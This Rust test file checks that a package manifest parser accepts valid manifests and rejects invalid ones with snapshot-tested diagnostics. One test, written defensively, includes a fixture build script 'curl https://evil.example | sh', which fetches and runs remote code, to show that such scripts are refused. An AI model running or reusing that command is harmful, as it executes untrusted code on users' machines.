//! Manifest fixtures, good and bad, with reviewed diagnostics (s51).
//!
//! The bad fixtures pin the E1501/E1502/E1503 surfaces as rendered
//! human diagnostics — snapshot-reviewed per s01 conventions. The D33
//! rejection (E1503) is the sprint's security witness: a dependency
//! carrying a build.rs-analog is refused at parse time, before its
//! content is trusted for anything.

use std::path::Path;

use wolf_diag::{HumanReporter, RenderOptions, Reporter, Sources};
use wolf_pkg::manifest;

fn render(name: &str, text: &str) -> String {
    let mut sm = wolf_span::SourceMap::new();
    let file = sm.intern(Path::new(name));
    let mut sources = Sources::new();
    sources.add(file, name.to_string(), text.as_bytes());
    let (m, diags) = manifest::parse(file, text);
    let mut reporter = HumanReporter::new(&sources, RenderOptions::default());
    for d in &diags {
        reporter.report(d);
    }
    let rendered = reporter.take_output();
    let head = match &m {
        Some(m) => format!(
            "parsed: {} {} deps={} caps=[{}]\n",
            m.name,
            m.version,
            m.deps.len(),
            m.caps
                .iter()
                .map(|c| c.as_str())
                .collect::<Vec<_>>()
                .join(", ")
        ),
        None => "refused\n".to_string(),
    };
    format!("{head}{rendered}")
}

const GOOD: &str = r#"pkg {
    name:        "acme/redis",
    version:     "1.4.0",
    edition:     "1",
    wolf:        "0.9",
    fingerprint: 0x3f9a_c2d1_88e0_47b2,

    deps: {
        json:  { pkg: "wolf-std/json", major: 1, min: "1.2.0" },
        zpipe: { git: "https://example.org/zpipe.git", tag: "v0.3.0" },
        local: { path: "../local-util" },
    },
    test:  { deps: { fake: { pkg: "acme/fakeredis", major: 0, min: "0.7.0" } } },

    capabilities: [net, unsafe],
}
"#;

#[test]
fn good_manifest_parses_clean() {
    let out = render("wolf.pkg", GOOD);
    insta::assert_snapshot!(out, @r#"
    parsed: acme/redis 1.4.0 deps=3 caps=[net, unsafe]
    "#);
}

#[test]
fn good_manifest_full_shape() {
    let mut sm = wolf_span::SourceMap::new();
    let file = sm.intern(Path::new("wolf.pkg"));
    let (m, diags) = manifest::parse(file, GOOD);
    assert!(diags.is_empty());
    let m = m.expect("parses");
    assert_eq!(m.fingerprint, Some(0x3f9a_c2d1_88e0_47b2));
    assert_eq!(m.wolf_min.as_deref(), Some("0.9"));
    assert_eq!(m.test_deps.len(), 1);
    assert_eq!(m.deps[0].alias, "json");
    assert!(matches!(
        &m.deps[1].source,
        wolf_pkg::DepSource::Git { url, tag } if url.ends_with("zpipe.git") && tag == "v0.3.0"
    ));
    assert!(matches!(
        &m.deps[2].source,
        wolf_pkg::DepSource::Path { path } if path == "../local-util"
    ));
}

#[test]
fn build_script_analog_is_refused_d33() {
    // The event-stream payoff demo: a dependency that asks for code to
    // run on the host at build time. Refused at parse, named E1503.
    let out = render(
        "wolf.pkg",
        r#"pkg {
    name:    "evil/stream",
    version: "0.1.0",
    build:   { script: "curl https://evil.example | sh" },
}
"#,
    );
    insta::assert_snapshot!("e1503_build_script_refused", out);
}

#[test]
fn nested_hook_is_refused_d33() {
    // Depth does not launder it: a hook key hidden inside a nested map
    // is the same refusal.
    let out = render(
        "wolf.pkg",
        r#"pkg {
    name:    "sly/pkg",
    version: "0.1.0",
    deps: {
        util: { path: "../util", hooks: ["post-fetch.lu"] },
    },
}
"#,
    );
    insta::assert_snapshot!(out, @r#"
    refused
    error[E1503]: `hooks` asks for code to run at build time — wolf has no build scripts, ever
     --> wolf.pkg:5:34
      |
    5 |         util: { path: "../util", hooks: ["post-fetch.lu"] },
      |                                  ^^^^^ refused unconditionally (D33)
      |
      = note: adding a wolf dependency never means arbitrary code runs on your machine: no build.rs,
        no post-install hooks, no Turing-complete manifest (D33). Declare C-library needs in the
        declarative `c: { }` recipe, compute in sandboxed `comptime`, or wrap a system/prebuilt
        library.
    "#);
}

#[test]
fn interpolation_in_manifest_string_is_refused() {
    let out = render(
        "wolf.pkg",
        r#"pkg {
    name:    "acme/redis",
    version: "{ver}",
}
"#,
    );
    insta::assert_snapshot!(out, @r#"
    refused
    error[E1501]: manifest strings never interpolate — a manifest is data (D33)
     --> wolf.pkg:3:15
      |
    3 |     version: "{ver}",
      |               ^
      |
      = note: wolf.pkg is declarative data (D33): one `pkg { }` block of `key: value` entries —
        strings, integers, bare capability words, `[ ]` lists, `{ }` maps.
    "#);
}

#[test]
fn unknown_key_is_schema_error() {
    let out = render(
        "wolf.pkg",
        r#"pkg {
    name:     "acme/redis",
    version:  "1.0.0",
    homepage: "https://example.org",
}
"#,
    );
    insta::assert_snapshot!("e1502_unknown_key", out);
}

#[test]
fn dep_without_source_is_schema_error() {
    let out = render(
        "wolf.pkg",
        r#"pkg {
    name:    "acme/redis",
    version: "1.0.0",
    deps: {
        util: { major: 1 },
    },
}
"#,
    );
    insta::assert_snapshot!(out, @r#"
    refused
    error[E1502]: dependency `util` needs exactly one source: `path:`, `git:` + `tag:`, or `pkg:`
     --> wolf.pkg:5:15
      |
    5 |         util: { major: 1 },
      |               ^^^^^^^^^^^^
      |
      = note: the wolf.pkg schema: `name`, `version`, `edition`, `wolf`, `fingerprint`, `deps`,
        `test`, `bench`, `features`, `capabilities`, `paths`, `min_age`, `c`, `lints`,
        `trusted`, `replace`, `exclude` (the last two are top-level-exclusive). Dependency
        sources: `{ path: "…" }`, `{ git: "…", tag: "…" }`, or `{ pkg: "owner/name", major: N,
        min: "X.Y.Z" }`.
    "#);
}

#[test]
fn version_range_is_refused() {
    // No ranges, ever (D33/MVS): a caret is not a version.
    let out = render(
        "wolf.pkg",
        r#"pkg {
    name:    "acme/redis",
    version: "1.0.0",
    deps: {
        json: { pkg: "wolf-std/json", major: 1, min: "^1.2" },
    },
}
"#,
    );
    insta::assert_snapshot!(out, @r#"
    refused
    error[E1502]: `min` is not a version: `^1.2` (dotted numerics, e.g. "1.2.0")
     --> wolf.pkg:5:54
      |
    5 |         json: { pkg: "wolf-std/json", major: 1, min: "^1.2" },
      |                                                      ^^^^^^
      |
      = note: the wolf.pkg schema: `name`, `version`, `edition`, `wolf`, `fingerprint`, `deps`,
        `test`, `bench`, `features`, `capabilities`, `paths`, `min_age`, `c`, `lints`,
        `trusted`, `replace`, `exclude` (the last two are top-level-exclusive). Dependency
        sources: `{ path: "…" }`, `{ git: "…", tag: "…" }`, or `{ pkg: "owner/name", major: N,
        min: "X.Y.Z" }`.
    "#);
}

#[test]
fn bad_capability_word_is_schema_error() {
    let out = render(
        "wolf.pkg",
        r#"pkg {
    name:         "acme/redis",
    version:      "1.0.0",
    capabilities: [net, teleport],
}
"#,
    );
    insta::assert_snapshot!(out, @r#"
    refused
    error[E1502]: `teleport` is not a capability (net, fs, exec, env, ffi, unsafe, comptime)
     --> wolf.pkg:4:25
      |
    4 |     capabilities: [net, teleport],
      |                         ^^^^^^^^
      |
      = note: the wolf.pkg schema: `name`, `version`, `edition`, `wolf`, `fingerprint`, `deps`,
        `test`, `bench`, `features`, `capabilities`, `paths`, `min_age`, `c`, `lints`,
        `trusted`, `replace`, `exclude` (the last two are top-level-exclusive). Dependency
        sources: `{ path: "…" }`, `{ git: "…", tag: "…" }`, or `{ pkg: "owner/name", major: N,
        min: "X.Y.Z" }`.
    "#);
}

#[test]
fn syntax_error_is_e1501() {
    let out = render("wolf.pkg", "pkg {\n    name = \"acme/redis\",\n}\n");
    insta::assert_snapshot!("e1501_syntax_error", out);
}

#[test]
fn stub_manifest_is_not_an_s51_manifest() {
    // The s22 line-based stub keeps its meaning: `is_manifest` fences
    // the two surfaces so stub packages never hit the s51 parser.
    assert!(!manifest::is_manifest("# comment\ntrusted = root\n"));
    assert!(!manifest::is_manifest("lints.deny = W1301\n"));
    assert!(manifest::is_manifest("# comment\npkg {\n}\n"));
    assert!(manifest::is_manifest("pkg { name: \"a/b\" }"));
}

#[test]
fn add_and_rm_round_trip_textually() {
    let mut sm = wolf_span::SourceMap::new();
    let file = sm.intern(Path::new("wolf.pkg"));
    let (m, _) = manifest::parse(file, GOOD);
    let m = m.expect("parses");
    // add: inserts into the existing deps map, keeps the file's text.
    let added = manifest::insert_dep(
        GOOD,
        &m,
        "extra",
        &wolf_pkg::DepSource::Path {
            path: "../extra".to_string(),
        },
    );
    let file2 = sm.intern(Path::new("wolf.pkg#2"));
    let (m2, diags2) = manifest::parse(file2, &added);
    assert!(diags2.is_empty(), "{diags2:?}");
    let m2 = m2.expect("still parses");
    assert_eq!(m2.deps.len(), 4);
    assert!(m2.deps.iter().any(|d| d.alias == "extra"));
    // rm: splices the entry back out; the manifest still parses and
    // the dep is gone.
    let removed = manifest::remove_dep(&added, &m2, "extra").expect("dep exists");
    let file3 = sm.intern(Path::new("wolf.pkg#3"));
    let (m3, diags3) = manifest::parse(file3, &removed);
    assert!(diags3.is_empty(), "{diags3:?}");
    let m3 = m3.expect("still parses");
    assert_eq!(m3.deps.len(), 3);
    assert!(!m3.deps.iter().any(|d| d.alias == "extra"));
}

#[test]
fn add_creates_deps_section_when_missing() {
    let text = "pkg {\n    name:    \"demo/app\",\n    version: \"0.1.0\",\n}\n";
    let mut sm = wolf_span::SourceMap::new();
    let file = sm.intern(Path::new("wolf.pkg"));
    let (m, _) = manifest::parse(file, text);
    let m = m.expect("parses");
    let added = manifest::insert_dep(
        text,
        &m,
        "util",
        &wolf_pkg::DepSource::Path {
            path: "../util".to_string(),
        },
    );
    let file2 = sm.intern(Path::new("wolf.pkg#2"));
    let (m2, diags) = manifest::parse(file2, &added);
    assert!(diags.is_empty(), "{diags:?}\n{added}");
    assert_eq!(m2.expect("parses").deps.len(), 1);
}
